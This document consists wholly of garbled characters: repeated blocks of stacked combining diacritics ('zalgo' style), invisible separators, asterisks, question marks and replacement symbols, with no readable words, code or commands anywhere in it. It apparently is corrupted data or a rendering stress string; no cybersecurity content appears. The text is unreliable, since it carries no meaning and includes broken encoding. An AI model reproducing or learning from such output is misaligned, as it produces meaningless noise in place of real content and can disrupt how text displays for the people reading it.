̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̬̘̥̗̤̺͛̇̅̀͝͡